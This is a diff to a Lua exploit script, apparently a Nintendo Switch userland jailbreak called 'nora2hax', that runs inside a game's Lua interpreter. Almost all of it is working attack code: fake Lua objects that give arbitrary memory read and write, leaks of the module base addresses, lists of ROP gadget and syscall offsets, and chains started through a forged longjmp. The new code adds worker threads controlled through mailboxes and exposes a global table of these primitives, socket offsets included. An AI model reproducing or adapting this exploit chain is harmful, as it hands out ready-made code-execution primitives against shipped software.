@@ -1,70 +1,6 @@
 -- the SDK bitches and aborts on an invalid mount name
 package.path = "./?.lua;save:/lib/?.lua"
 
-local old_print = print
-
-local function init_console()
-	e:tag{
-		"lyc",
-		color = "0xFF000000",
-		width = "1280",
-		height = "720",
-		id = "0"
-	}
-	e:tag{"fontinit"}
-	e:tag{
-		"chgmsg",
-		id = "debug_mw"
-	}
-	e:tag{
-		"font",
-		anchorcenter = "0",
-		face = "save:/proggy.ttf",
-		-- face = "font/VL-Gothic-Regular.ttf",
-		left = "5",
-		top = "5",
-		width = "1270",
-		height = "710",
-		size = "26",
-		rubysize = "0",
-		spacetop = "0",
-		spacemiddle = "0",
-		spacebottom = "0",
-		color = "0xFFFFFF",
-		shadowcolor = "0x000000",
-		outlinecolor = "0x000000",
-		shadow = "0",
-		outline = "0",
-		rubyshadow = "0",
-		rubyoutline = "0",
-		align = "left",
-		style = "",
-		hung = "1",
-		stack = "0"
-	}
-	-- e:tag { "/chgmsg" }
-	-- e:tag { "chgmsg", id = "debug_mw" }
-
-	print = function(...)
-		local args = {...}
-		local formatted_args = {}
-		for i, v in ipairs(args) do
-			if type(v) == "string" then
-				formatted_args[i] = v
-			else
-				formatted_args[i] = tostring(v)
-			end
-		end
-		old_print(unpack(args))
-		e:tag{
-			"print",
-			data = table.concat(formatted_args, " ")
-		}
-		e:tag{"rt"}
-		-- e:tag { "flip" }
-	end
-end
-
 local function fatal(err)
 	local okfmt, msg = pcall(tostring, err)
 	if not okfmt then
@@ -90,8 +26,8 @@ local function i2f(x)
 end
 
 local offsets_main = {
-	-- luaB_print (C closure target)
 	luaB_print = 0x129020,
+	luaB_auxwrap = 0x129e80,
 	-- luaD_rawrunprotected's setjmp return
 	luaD_rawrunprotected_setjmp_va = 0x12fc7c,
 	-- luaD_throw tail (longjmp(lj+8, 1))
@@ -131,6 +67,17 @@ local offsets_sdk = {
 	svc_wait_sync = 0x0d9774,
 	-- svc #0x16 ; ret   (x0=handle)
 	svc_close_handle = 0x0d9764,
+	-- svc #0x34 ; ret   (x0=addr, x1=ArbitrationType, x2=value,
+	-- x3=timeout_ns; 0 is an immediate TimedOut, negative is infinite)
+	svc_wait_for_address = 0x0d989c,
+	-- svc #0x35 ; ret   (x0=addr, x1=SignalType, x2=value, x3=count;
+	-- count <= 0 wakes every waiter)
+	svc_signal_to_address = 0x0d98a4,
+	-- WaitLightEvent's svcWaitForAddress block, entered at mov x3,#-1:
+	-- x19=addr, WaitIfEqual on value 1, infinite timeout, returns through
+	-- a 0x40-byte caller frame.  g_call3_void zeroes x3, so this is the
+	-- only reachable infinite-timeout wait in the SDK.
+	wait_for_address_eq1_inf = 0x0aa86c,
 	-- mrs x0,tpidrro_el0 ; ret
 	get_message_buffer_on_tls = 0x0bfea0,
 	-- nn::fs::detail lazy singleton (.bss)
@@ -144,7 +91,22 @@ local offsets_sdk = {
 	-- ldr w0,[x0,#0x44]; ret (pure, no TLS)
 	get_thread_priority = 0x0ad7f0,
 	-- nn::err::ShowApplicationError
-	show_application_error = 0x1a0f60
+	show_application_error = 0x1a0f60,
+	-- nn::socket::*
+	socket_initialize = 0xc1c80,
+	socket_socket = 0xc18e0,
+	socket_bind = 0xc17d0,
+	socket_listen = 0xc1860,
+	socket_accept = 0xc17b0,
+	socket_recv = 0xc1720,
+	socket_send = 0xc1760,
+	socket_close = 0xc1930,
+	socket_fcntl = 0xc1980,
+	socket_get_last_error = 0xc1b80,
+	-- vcall8: ldp x0..x8,x19,x29,x30; br x16 (x16 is preset by the loop)
+	vcall8_pop = 0xb808c,
+	-- ldp x16,x17,[sp],#0x10; ret  (the x16 loader the prelude blrs)
+	vcall8_load_x16 = 0x7008
 }
 
 -- since our arb r/w needs 24 bytes for w/r cycle the next 2 GOT offsets we write get trashed! choose carefully :)
@@ -160,6 +122,8 @@ local gadgets = {
 	g_load_x0 = 0x076780,
 	-- ldp x29,x30,[sp,#0x10]; ldr x19,[sp,#8]; ldr d8,[sp],#0x20; ret
 	g_load_x19 = 0x01eee8,
+	-- ldr x0,[x19]; ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
+	g_peek_x0_x19 = 0x1463c8,
 	-- str x0,[x19]; ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
 	g_store_x0_x19 = 0x066970,
 	-- sub sp,x29,#0x50; ...; ret
@@ -180,6 +144,13 @@ local gadgets = {
 	-- ldp x20,x19,[sp,#0x20]; ldp x22,x21,[sp,#0x10];
 	-- ldr x28,[sp],#0x40; ret   (worker entry)
 	g_thread_pivot = 0x111dcc,
+	-- sub sp,x29,#0x50; ...; ldp x29,x30,[sp,#0x50];
+	-- ...; ldp x28,x27,[sp],#0x60; ret   (loop loader)
+	g_pivot = 0x14a94c,
+	-- ldr x8,[x19,#0x48]; ldr x1,[x19,#0x38]; ldr x0,[x19,#0x50];
+	-- blr x8; str xzr,[x19,#0x38]; ldp x29,x30,[sp,#0x10];
+	-- ldp x20,x19,[sp],#0x20; ret   (job call: x0/x1 only)
+	g_call2 = 0x0b7a88,
 	-- main PLT stub for longjmp (imported)
 	plt_longjmp = 0x22a5b8,
 	-- main .got.plt JUMP_SLOT for longjmp
@@ -221,13 +192,21 @@ local layout = {
 	thread_tt_size = 0x1C0, -- through the u32 handle at +0x1b8
 	thread_tt_alloc = 0x200, -- zeroed through +0x1f8
 	slack = 0x10,
+	worker_count = 12,
 	worker_stride = 0x3000,
 	worker_block_size = 0x24000,
+	worker_align = 0x1000,
 	worker_tt_off = 0x000,
+	worker_handle_off = 0x1B8,
+	worker_prio_off = 0x44,
+	worker_stack_size_off = 0x50,
+	worker_stack_ptr_off = 0x58,
 	worker_stack_off = 0x200,
 	worker_stack_size = 0x800,
 	worker_top_off = 0xA00,
 	worker_pd_off = 0xBB0, -- TOP + 0x1B0
+	worker_pd_x29_off = 0xBE0,
+	worker_pd_x30_off = 0xBE8,
 	worker_chain_off = 0xBF0, -- TOP + 0x1F0
 	worker_chain_size = 0x410,
 	worker_desc_off = 0x1000,
@@ -238,19 +217,28 @@ local layout = {
 	worker_marker_off = 0x1C10,
 	worker_string_off = 0x1C30,
 	worker_scratch_off = 0x1C50,
-	worker_ipc_off = 0x2000, -- one page-aligned #0x22 buffer per worker
+	mailbox_cmd = 0x1C80,
+	mailbox_ack = 0x1CA0,
+	mailbox_status = 0x1CC0,
+	mailbox_arg = 0x1CE0,
+	job = 0x1D00,
+	loop_scratch = 0x1D60,
+	job_signal = 0x1D80,
+	worker_ipc_off = 0x2000,
 	worker_ipc_size = 0x1000
 }
 
 local AddressMap39Start = 0x08000000
 local AddressMap39End = 0x7fffffffff
 
-local function exploit()
-	collectgarbage("stop")
-	init_console()
+local MAILBOX_ARMED = 1
+local MAILBOX_GO = 2
 
-	print("[*] goonhax by alula")
-	print("[*] sending big thanks to: Gezine, pepsipu, retr0id, SciresM, kurumuz, zecoxao")
+local function setup()
+	collectgarbage("stop")
+
+	print("[*] nora2hax by alula")
+	print("[*] sending big thanks to: Gezine, kurumuz, zecoxao, DialingSpoon")
 
 	print("[+] setting up initial primitives...")
 	local HELPER_READ =
@@ -286,6 +274,7 @@ local function exploit()
 		w64(a + 0x8, 3) -- tt = LUA_TNUMBER
 		return r64(a)
 	end
+
 	local function save_cf(a)
 		return destructive_read(a + 0x20)
 	end
@@ -293,14 +282,22 @@ local function exploit()
 		w64(a + 0x20, f)
 	end
 
-	-- initialize initial 64k pool
-	local pool = {}
-	for i = 1, 1024 do
-		pool[i] = 0
-	end
-	local pool_addr = addrof(pool)
-	w64(pool_addr + 0x20, 3)
-	local heap = r64(pool_addr + 0x18)
+	local scratch_str = string.rep("\0", 0x4000)
+	_G._pinned_scratch = scratch_str
+
+	local box = { 0, 0 }
+	_G._pinned_box = box
+	local box_addr = addrof(box)
+	assert(box_addr, "addrof(box) failed")
+	w64(box_addr + 0x20, 3) -- tag slot for the array-pointer read below
+	local box_array = r64(box_addr + 0x18)
+	assert(box_array and box_array ~= 0, "box has no array part")
+	box[1] = scratch_str
+	w64(box_array + 8, 3) -- slot 1 tt = LUA_TNUMBER;
+	local scratch_ts = r64(box_array)
+	box[1] = 0
+	assert(scratch_ts and scratch_ts ~= 0, "scratch TString unreadable")
+	local heap = scratch_ts + 0x18 -- TString data area
 
 	local scratch = heap + 0x900
 	w64(scratch, 0x12676721372137)
@@ -310,9 +307,14 @@ local function exploit()
 
 	-- leak main / sdk module bases
 	print("[*] leaking module bases")
-	local cls_print_addr = addrof(old_print)
-	local print_addr = save_cf(cls_print_addr)
-	local main_base = print_addr - offsets_main.luaB_print
+
+	local anchor_co = coroutine.wrap(function() return true end)
+	local anchor_addr = addrof(anchor_co)
+	assert(anchor_addr, "core: addrof(coroutine.wrap) failed")
+	local anchor_f = save_cf(anchor_addr)
+	anchor_co = nil -- the damaged upvalue must never be traversed
+	assert(anchor_f and anchor_f ~= 0, "core: anchor closure read failed")
+	local main_base = anchor_f - offsets_main.luaB_auxwrap
 	assert(main_base % 0x1000 == 0, "failed to leak main module base")
 
 	print(string.format("[+] main @ 0x%x", main_base))
@@ -337,6 +339,8 @@ local function exploit()
 
 			local state
 			local ok, err = pcall(function()
+				-- errfunc is the tag word of errorJmp; a read needs it and
+				-- the write is restored right after
 				w64(L + offsets_lua.errfunc, 3)
 				local live = r64(L + offsets_lua.errorjmp)
 				w64(L + offsets_lua.errfunc, 0)
@@ -397,7 +401,7 @@ local function exploit()
 		return rok, rerr
 	end
 
-	local function new_emitter(chain_base, desc_base, desc_end, scratch, chain_end)
+	local function new_emitter(chain_base, desc_base, desc_end, chain_end, scratch)
 		local E = {
 			cursor = chain_base,
 			desc = desc_base,
@@ -447,8 +451,86 @@ local function exploit()
 			w64(b + 8, cell or (heap + layout.rop_result)) -- x19 = result cell
 			w64(b + 0x10, 0) -- x29
 			self.cursor = b + 0x20
-			self.pending = b + 0x18 -- x30
+			self.pending = b + 0x18 -- x30, patched by the next emission
+			self:g1(cell or (heap + layout.rop_result))
 			self:g2(0, 0) -- str x0,[result cell]
+		end
+		-- svcWaitForAddress(addr, WaitIfEqual, 1, -1)
+		function E:wait_eq1(addr, x29v)
+			self:g1(addr)
+			self:patch(sdk_base + offsets_sdk.wait_for_address_eq1_inf)
+			local b = self.cursor
+			w64(b, 0) -- the site's Result store
+			w64(b + 8, 0)
+			w64(b + 0x10, 0) -- x22
+			w64(b + 0x18, 0) -- x21
+			w64(b + 0x20, 0) -- x20
+			w64(b + 0x28, 0) -- x19
+			w64(b + 0x30, 0) -- x29
+			self.cursor = b + 0x40
+			self.pending = b + 0x38 -- x30, patched by the next emission
+		end
+		function E:vcall2(desc)
+			self:g1(desc)
+			self:patch(code(gadgets.g_call2))
+			local b = self.cursor
+			w64(b, 0) -- x20
+			w64(b + 8, desc) -- x19
+			w64(b + 0x10, 0) -- x29
+			self.cursor = b + 0x20
+			self.pending = b + 0x18 -- x30, patched by the next emission
+		end
+		function E:loop(chain)
+			self:patch(code(gadgets.g_load_x0))
+			local b = self.cursor
+			w64(b, 0)
+			w64(b + 8, 0) -- x0
+			w64(b + 0x10, chain + 0x50) -- x29
+			w64(b + 0x18, main_base + gadgets.g_pivot) -- x30
+			self.cursor = b + 0x20
+			self.pending = nil
+		end
+		function E:flush() end
+		function E:job_header(chain, arg)
+			for off = 0, 0x60 - 8, 8 do
+				w64(chain + off, 0)
+			end
+			w64(chain + 0x48, arg) -- g_pivot's x19
+			w64(chain + 0x50, 0) -- g_pivot's x29
+			w64(chain + 0x58, main_base + gadgets.g_load_x8_call5)
+		end
+		function E:job_prelude(arg)
+			local P = self.cursor
+			w64(P + 0x00, sdk_base + offsets_sdk.vcall8_load_x16) -- x8
+			w64(P + 0x08, 0) -- x9
+			w64(P + 0x10, arg) -- x19 after the store
+			w64(P + 0x20, 0) -- x29
+			w64(P + 0x28, main_base + gadgets.g_blr_x8_keep_x0) -- x30
+			w64(P + 0x30, main_base + gadgets.g_call2) -- x16, loaded by the callee
+			w64(P + 0x38, 0) -- x17
+			w64(P + 0x40, 0) -- x19 after g_blr
+			w64(P + 0x50, 0) -- x29 after g_blr
+			w64(P + 0x58, main_base + gadgets.g_load_x19) -- ret -> the wait frame
+			self.cursor = P + 0x60
+			self.pending = nil
+		end
+		function E:job_call(job)
+			self:patch(sdk_base + offsets_sdk.vcall8_pop)
+			local V = self.cursor
+			for off = 0, 0x38, 8 do
+				w64(V + off, 0) -- x0..x7, rewritten by the caller
+			end
+			w64(V + 0x40, 0) -- x8
+			w64(V + 0x48, job) -- x19 for g_call2
+			w64(V + 0x50, 0) -- x29
+			w64(V + 0x58, 0) -- x30 popped (br x16 does not use it)
+			w64(V + 0x60, 0) -- g_call2's epilogue x20
+			w64(V + 0x68, 0) -- g_call2's epilogue x19
+			w64(V + 0x70, 0) -- g_call2's epilogue x29
+			w64(V + 0x78, 0) -- g_call2's epilogue x30: patched by the next op
+			self.cursor = V + 0x80
+			self.pending = V + 0x78
+			return V
 		end
 		function E:call3(target, x0v, x1v, x2v)
 			self:patch(code(gadgets.g_load_x0))
@@ -527,16 +609,17 @@ local function exploit()
 	local rop_chain = heap + layout.rop_chain
 	local longjmp_b = offsets_lua.lj_b
 
-	local function chain_builder(emit)
+	local function chain_builder(emit, chain_base, chain_end)
+		chain_base = chain_base or rop_chain
+		chain_end = chain_end or (heap + layout.rop_result - layout.slack)
 		return function(ctx)
 			for off = 0, offsets_lua.jmpbuf_scan, 8 do
 				w64(rop_backup + off, ctx.slots[off])
 			end
 
-			local E = new_emitter(rop_chain, heap + layout.main_calls,
+			local E = new_emitter(chain_base, heap + layout.main_calls,
 				heap + layout.main_calls + layout.main_calls_size,
-				heap + layout.rop_scratch,
-				heap + layout.rop_result - layout.slack)
+				chain_end, heap + layout.rop_scratch)
 
 			local b = E.cursor
 			w64(b + 8, 0); w64(b + 0x10, 0)
@@ -554,7 +637,7 @@ local function exploit()
 			end
 			
 			w64(rop_forged + longjmp_b + ctx.pc_off, main_base + gadgets.g_load_x19)
-			w64(rop_forged + longjmp_b + ctx.sp_off, rop_chain)
+			w64(rop_forged + longjmp_b + ctx.sp_off, chain_base)
 			w64(ctx.live + offsets_lua.lj_status, offsets_lua.lua_errrun)
 		end
 	end
@@ -565,13 +648,26 @@ local function exploit()
 		error("meow", 0)
 	end
 
-	local function call5(target, a0, a1, a2, a3, a4, result_cell)
+	local function run_chain(emit, chain_base, chain_end)
+		local rok, rerr = run_rop{
+			build = function(ctx)
+				return chain_builder(emit, chain_base, chain_end)(ctx)
+			end,
+			fire = fire8,
+			capture_jmpbuf = true
+		}
+		if not rok then
+			print("[!] chain coroutine failed: " .. tostring(rerr))
+		end
+	end
+
+	local function call5(target, a0, a1, a2, a3, a4, result_cell, chain_base, chain_end)
 		local RES = result_cell or (heap + layout.rop_result)
 		run_rop{
 			build = function(ctx)
 				return chain_builder(function(E)
 					E:call5(target, a0, a1, a2, a3, a4, RES)
-				end)(ctx)
+				end, chain_base, chain_end)(ctx)
 			end,
 			fire = fire8,
 			capture_jmpbuf = true
@@ -583,14 +679,42 @@ local function exploit()
 	local function check_ounce()
 		local OUT = heap + layout.rop_ounce
 		w64(OUT, 0)
-		local res = call5(sdk_base + offsets_sdk.svc_get_info, OUT, 32, 0xFFFF8001, 0, 0)
-		w64(OUT + 8, 3)
-		local value = r64(OUT)
+		local res = call5(sdk_base + offsets_sdk.svc_get_info,
+			OUT, 32, 0xFFFF8001, 0, 0)
 		return res == 0
 	end
 
 	local is_ounce = check_ounce()
 	print("[*] running on:", is_ounce and "Ounce" or "NX")
+
+	local RES = heap + layout.rop_result
+	local node_probe = {}
+	local node_probe_addr = addrof(node_probe)
+	assert(node_probe_addr, "core: addrof(node probe) failed")
+	run_chain(function(E)
+		E:peek(node_probe_addr + 0x20, RES)
+	end)
+	w64(RES + 8, 3)
+	local dummynode = r64(RES)
+	assert(dummynode and dummynode ~= 0 and dummynode % 8 == 0,
+		"core: could not read dummynode")
+	w64(box_addr + 0x20, dummynode) -- node; the tag spills into lastfree
+	w64(box_addr + 0x28, dummynode) -- lastfree; the tag spills into gclist
+
+	-- TString* of a live string with no header writes at all: park it in the
+	-- box's array slot 1 and read the raw eight bytes with the ROP peek.
+	local function str_addr(s)
+		assert(type(s) == "string", "core: str_addr wants a string")
+		box[1] = s
+		run_chain(function(E)
+			E:peek(box_array, RES)
+		end)
+		w64(RES + 8, 3)
+		local ts = r64(RES)
+		box[1] = 0
+		assert(ts and ts ~= 0, "core: str_addr read failed")
+		return ts
+	end
 
 	local function tpidrro_el0()
 		return call5(sdk_base + offsets_sdk.get_message_buffer_on_tls, 0, 0, 0, 0, 0)
@@ -599,7 +723,236 @@ local function exploit()
 	local tls_addr = tpidrro_el0()
 	print(string.format("[+] TPIDRRO_EL0=0x%x", tls_addr))
 
+	local function wstr(addr, s)
+		for i = 1, #s, 4 do
+			local v = 0
+			for j = 3, 0, -1 do
+				v = v * 256 + (s:byte(i + j) or 0)
+			end
+			w64(addr + i - 1, v)
+		end
+	end
 
+	local function alloc(size)
+		return call5(main_base + offsets_main.malloc, size, 0, 0, 0, 0,
+			heap + layout.rop_result)
+	end
+
+	local function free_block(ptr)
+		run_chain(function(E)
+			E:call3(main_base + offsets_main.free, ptr, 0, 0)
+		end)
+	end
+
+	-- Deep SDK calls need a real stack: run_chain's default chain area is
+	-- only a few hundred bytes.  Build the chain at the top of a 128 KiB
+	-- block and let the callee grow down into the rest of it.
+	local deep_stack
+	local function call_deep(target, a0, a1, a2, a3, a4)
+		if not deep_stack then
+			deep_stack = alloc(0x20000)
+			assert(deep_stack and deep_stack ~= 0,
+				"core: deep stack allocation failed")
+		end
+		local base = deep_stack + 0x1E000
+		-- run_rop rewrites lua_State.errorJmp; the collector must not run
+		-- between that rewrite and the longjmp back.
+		local r = call5(target, a0, a1, a2, a3, a4,
+			heap + layout.rop_result, base, deep_stack + 0x20000)
+		return r
+	end
+
+	local raw_block = alloc(layout.worker_block_size + 0x1000 - 1)
+	if not raw_block or raw_block == 0 then
+		error("worker block allocation failed", 0)
+	end
+	local block = raw_block + 0xfff
+	block = block - block % 0x1000
+	print(string.format("[+] worker block @ 0x%x", block))
+
+	local function worker(i, off)
+		return block + i * layout.worker_stride + off
+	end
+
+	local function build_worker_loop(i, area)
+		local chain = area.chain
+		for off = 0, 0x60 - 8, 8 do
+			w64(chain + off, 0)
+		end
+		w64(chain + 0x50, 0) -- g_pivot's x29
+		w64(chain + 0x58, main_base + gadgets.g_load_x19) -- g_pivot's x30
+		local E = new_emitter(chain + 0x60, area.desc, area.desc_end,
+			area.chain_end, heap + layout.rop_scratch)
+		E:wait_eq1(worker(i, layout.mailbox_cmd))
+		E:vcall2(worker(i, layout.job))
+		E:g1(worker(i, layout.worker_marker_off))
+		E:g2(0, 0)
+		E:peek(worker(i, layout.job) + 0x40, worker(i, layout.mailbox_status))
+		E:g0(1)
+		E:g1(worker(i, layout.mailbox_cmd))
+		E:g2(0, 0)
+		E:g0(0)
+		E:g1(worker(i, layout.mailbox_ack))
+		E:g2(0, 0)
+		E:vcall2(worker(i, layout.job_signal))
+		E:loop(chain)
+		if E.cursor > E.chain_end then
+			error("worker loop overlaps its end", 0)
+		end
+	end
+
+	local function prepare(i, builder, w, L)
+		w = w or worker
+		L = L or layout
+		local tt = w(i, L.worker_tt_off)
+
+		for off = 0, L.thread_tt_alloc - 8, 8 do
+			w64(tt + off, 0)
+		end
+		w64(tt + L.worker_prio_off, L.thread_priority)
+		w64(tt + L.worker_stack_size_off, L.worker_stack_size)
+		w64(tt + L.worker_stack_ptr_off, w(i, L.worker_stack_off))
+
+		local pd = w(i, L.worker_pd_off)
+		for off = 0, 0x40, 8 do
+			w64(pd + off, 0)
+		end
+		w64(w(i, L.worker_pd_x29_off),
+			w(i, L.worker_chain_off) + 0x50)
+		w64(w(i, L.worker_pd_x30_off), main_base + gadgets.g_pivot)
+
+		w64(w(i, L.worker_out_off), 0)
+		w64(w(i, L.worker_wait_off), 0)
+		w64(w(i, L.worker_marker_off), 0)
+		w64(w(i, L.mailbox_cmd), MAILBOX_ARMED)
+		w64(w(i, L.mailbox_ack), MAILBOX_ARMED)
+		w64(w(i, L.mailbox_status), 0)
+		w64(w(i, L.mailbox_arg), 0)
+		w64(w(i, L.job) + 0x38, 0)
+		w64(w(i, L.job) + 0x40, 0)
+		w64(w(i, L.job) + 0x48, 0)
+		w64(w(i, L.job) + 0x50, 0)
+		w64(w(i, L.loop_scratch), 0)
+
+		-- static ack signal descriptor: fn=svc #0x35, x0=ack, x1=0
+		local sig = w(i, L.job_signal)
+		w64(sig + 0x38, 0)
+		w64(sig + 0x48, sdk_base + offsets_sdk.svc_signal_to_address)
+		w64(sig + 0x50, w(i, L.mailbox_ack))
+
+		local area = {
+			chain = w(i, L.worker_chain_off),
+			chain_end = w(i, L.worker_desc_off) - L.slack,
+			desc = w(i, L.worker_desc_off),
+			desc_end = w(i, L.worker_desc_off) + L.worker_desc_size
+		}
+		local run_builder = builder or build_worker_loop
+		run_builder(i, area, w, L)
+	end
+
+	local function spawn(i, w, L)
+		w = w or worker
+		L = L or layout
+		local tt = w(i, L.worker_tt_off)
+		run_chain(function(E)
+			E:call3(sdk_base + offsets_sdk.thread_impl_create, 0, tt,
+				main_base + gadgets.g_thread_pivot)
+			E:call3(sdk_base + offsets_sdk.thread_impl_start, 0, tt, 0)
+		end)
+		-- the handle is a u32 at +0x1b8; tag the cell above it before the read
+		w64(tt + L.worker_handle_off + 8, 3)
+		local raw = r64(tt + L.worker_handle_off)
+		if raw then
+			return raw % 0x100000000
+		end
+		return nil
+	end
+
+	local function send_job(i, seq, fn, x0, x1)
+		local job = worker(i, layout.job)
+		w64(job + 0x38, x1)
+		w64(job + 0x40, seq)
+		w64(job + 0x48, fn)
+		w64(job + 0x50, x0)
+		w64(worker(i, layout.mailbox_ack), MAILBOX_ARMED)
+		w64(worker(i, layout.mailbox_cmd), MAILBOX_GO)
+		run_chain(function(E)
+			-- svcSignalToAddress(&worker->mailbox_cmd, SignalType_Signal, value=0, numToSignal=?)
+			E:call3(sdk_base + offsets_sdk.svc_signal_to_address,
+				worker(i, layout.mailbox_cmd), 0, 0)
+			-- loop till ack
+			E:wait_eq1(worker(i, layout.mailbox_ack))
+		end)
+	end
+
+	local function stop_worker(i)
+		local job = worker(i, layout.job)
+		w64(job + 0x38, 0)
+		w64(job + 0x40, 0)
+		w64(job + 0x48, sdk_base + offsets_sdk.svc_exit_thread)
+		w64(job + 0x50, 0)
+		w64(worker(i, layout.mailbox_cmd), MAILBOX_GO)
+		run_chain(function(E)
+			-- svcSignalToAddress(&worker->mailbox_cmd, SignalType_Signal, value=0, numToSignal=?)
+			E:call3(sdk_base + offsets_sdk.svc_signal_to_address,
+				worker(i, layout.mailbox_cmd), 0, 0)
+		end)
+	end
+
+	local function join(i, handle)
+		local tt = worker(i, layout.worker_tt_off)
+		run_chain(function(E)
+			-- svcWaitSynchronization(&out, &handle, numHandles=1, timeout=0)
+			E:call3(sdk_base + offsets_sdk.svc_wait_sync,
+				worker(i, layout.worker_wait_off),
+				tt + layout.worker_handle_off, 1)
+			-- svcCloseHandle(handle)
+			E:call3(sdk_base + offsets_sdk.svc_close_handle, handle or 0, 0, 0)
+		end)
+	end
+
+	local function poll(i)
+		return destructive_read(worker(i, layout.worker_marker_off)),
+			destructive_read(worker(i, layout.mailbox_status)),
+			destructive_read(worker(i, layout.mailbox_ack))
+	end
+
+	_G.n2h = {
+		platform = is_ounce and "Ounce" or "NX",
+		main_base = main_base,
+		sdk_base = sdk_base,
+		gadgets = gadgets,
+		offsets_main = offsets_main,
+		offsets_sdk = offsets_sdk,
+		layout = layout,
+		addrof = addrof,
+		sdk = function(name)
+			local va = offsets_sdk[name]
+			assert(va, "unknown offset " .. tostring(name))
+			return sdk_base + va
+		end,
+		peek = destructive_read,
+		poke = w64,
+		str_addr = str_addr,
+		write_bytes = wstr,
+		alloc = alloc,
+		free = free_block,
+		call_deep = call_deep,
+		run_chain = run_chain,
+		new_emitter = new_emitter,
+		worker = worker,
+		worker_count = layout.worker_count,
+		worker_text = layout.worker_text or layout.worker_string_off,
+		block_raw = raw_block,
+		prepare = prepare,
+		spawn = spawn,
+		post = send_job,
+		poll = poll,
+		stop = stop_worker,
+		join = join,
+		log = print,
+	}
+	collectgarbage("restart")
 end
 
-xpcall(exploit, fatal)
+xpcall(setup, fatal)
